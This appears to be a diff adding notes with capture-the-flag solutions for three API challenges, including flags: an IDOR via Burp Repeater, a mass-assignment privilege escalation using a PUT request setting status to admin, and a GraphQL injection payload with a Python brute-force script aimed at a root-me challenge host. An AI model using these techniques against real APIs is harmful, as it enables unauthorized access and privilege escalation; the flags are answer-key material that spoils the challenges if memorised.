@@ -1,0 +1,94 @@
+API Broken={E4sy_1d0r_0n_API}
+# START: Follow the below instructions to solve the challenge.
+
+# Step 1: Start the Challenge and Open open burp suite (also setup the proxy and turn on interception).
+
+# Step 2: Expand the /api/signup section and Sign up using any username and password.
+
+# Step 3: Expand the /api/login section and Login using that account.
+
+# Step 4: Expand the /api/user section and enter any user id in the user_id field.
+
+# Step 5: Now, open burp suite and send the /api/user request to the Repeater.
+
+# Step 6: In the Repeater, Change /api/user path to /api/user/1 and send the request.
+
+# END: You should see the flag in the response window.
+
+
+{4lw4yS_ch3ck_0pt10ns_m3th0d}-->API Mass
+
+
+In this challenge we need to get admin role to access the content of /api/flag.
+
+1. As the name the name of challenge "API - Mass Assignment" refers to a type of vulnerability. After reading about that from here. I got the idea what it is.
+
+2. I checked the allowed http methods on each endpoint using BurpSuite:
+
+OPTIONS /api/signup
+OPTIONS /api/login
+OPTIONS /api/user
+OPTIONS /api/note
+OPTIONS /api/flag
+
+Found that /api/user has ’PUT’ method enabled.
+Now, it’s time to have some fun......
+
+3. Created a user with username = ’u5’ from /api/signup
+
+4. Logged in with new created user and server response is looked like
+
+{"note":"",
+"status":"guest",
+"userid":77,
+"username":"u5"}
+5. Here we can see that ’status’ is ’guest’, we have to change that to ’admin’.
+6. Now , we had checked that this /api/user has ’PUT’ method allowed and PUT methods is used to update the web/server content.
+7. I crafted the request as:
+— > changed the GET method to PUT
+— > added the header ’Content-Type: application/json’ #this header is used to make the server accept json content by letting it know that data sent is json
+— > and in last added the body content in json format like:
+
+{
+"status":"admin"
+}
+8. Response from the server :
+{"message":"User updated sucessfully."}
+
+9. Now, make GET request to /api/flag with updated user cookie in request.
+
+10. Flag is received, challenge solved.
+
+
+
+{3esy_gr@phql_b@ck3nd_1nj3ct10n} --->Gql injection
+
+
+1. You must know injection payload :
+
+payload : China"){country} PAYLOAD}#}"
+How the payload work is first we close whatever(country) using ") and print country then payload. #" is to comment all character after #
+
+2. Get HackerInSpace value :
+China"){country} HackerInSpace(hacker_id:13){hacker_value}}#}"
+
+3. But in this case we must brute HackerInSpace id to get 1 by 1 character in hacker_value :
+
+import requests as rq
+import json
+
+url = "http://challenge01.root-me.org:59078/rocketql"
+for i in range(100):
+       payload = 'China"){country} HackerInSpace(hacker_id:'+str(i)+'){hacker_value}}#}"'
+       data = {"q":payload}
+       res = rq.post(url,data=data)
+       x = json.loads(res.text)
+       try:
+               print(x["data"]["HackerInSpace"][0]["hacker_value"],end="")
+       except:pass
+
+
+
+
+
+
